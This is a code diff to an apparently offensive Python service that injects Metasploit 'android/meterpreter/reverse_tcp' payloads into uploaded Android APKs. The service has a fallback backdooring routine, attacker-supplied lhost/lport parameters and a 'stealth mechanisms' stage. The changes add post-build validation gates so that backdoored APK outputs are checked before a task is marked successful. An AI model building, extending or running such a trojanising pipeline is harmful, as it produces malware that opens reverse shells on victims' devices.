@@ -61,6 +61,7 @@ ENABLE_HTTP_ARTIFACTS = os.environ.get("ENABLE_HTTP_ARTIFACTS", "false").lower()
 ORCH_AUTH_TOKEN_REQUIRED = os.environ.get("ORCH_AUTH_TOKEN_REQUIRED", "false").lower() == "true"
 ENABLE_FALLBACK_BACKDOOR_APK = os.environ.get("ENABLE_FALLBACK_BACKDOOR_APK", "false").lower() == "true"
 ORCH_AUTH_TOKEN = os.environ.get("ORCH_AUTH_TOKEN", "")
+POSTBUILD_GATE_ENABLED = os.environ.get("POSTBUILD_GATE_ENABLED", "true").lower() == "true"
 
 # Tools paths under repository (preferred when available)
 ANDROID_SDK_DIR = WORKSPACE / "tools" / "android-sdk"
@@ -838,13 +839,30 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             if ENABLE_FALLBACK_BACKDOOR_APK:
                 fb_ok = fallback_backdoor_apk(original_apk, workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk"), params.get("lhost", "127.0.0.1"), params.get("lport", "4444"), params.get("payload", "android/meterpreter/reverse_tcp"), build_log)
                 if fb_ok:
-                    _finalize_task(t, workspace, succeeded=True, err=None)
+                    # Validate post-build for fallback output
+                    # Determine output name same as in fallback preparation
+                    fb_out = workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk")
+                    if validate_postbuild(fb_out, build_log):
+                        _finalize_task(t, workspace, succeeded=True, err=None)
+                    else:
+                        _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed (fallback)")
                     return
             _finalize_task(t, workspace, succeeded=False, err="Payload injection failed")
             return
         
         with build_log.open("a") as log:
             log.write("Payload injection completed successfully\n")
+        
+        # Post-build validation gate on pipeline final output if already at workspace/output
+        # Find most recent output APK
+        cand = None
+        out_dir = workspace / "output"
+        for p in sorted(out_dir.glob("*.apk"), key=lambda x: x.stat().st_mtime, reverse=True):
+            cand = p
+            break
+        if cand and not validate_postbuild(cand, build_log):
+            _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed")
+            return
         
         # Step 5: Apply stealth mechanisms
         with build_log.open("a") as log:
@@ -1131,6 +1149,11 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         
         if not final_apk.exists():
             raise Exception("Final APK not generated")
+        
+        # Enforce post-build validation gate on final_apk
+        if not validate_postbuild(final_apk, build_log):
+            _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed (final)")
+            return
         
         final_size = final_apk.stat().st_size
         original_size = original_apk.stat().st_size
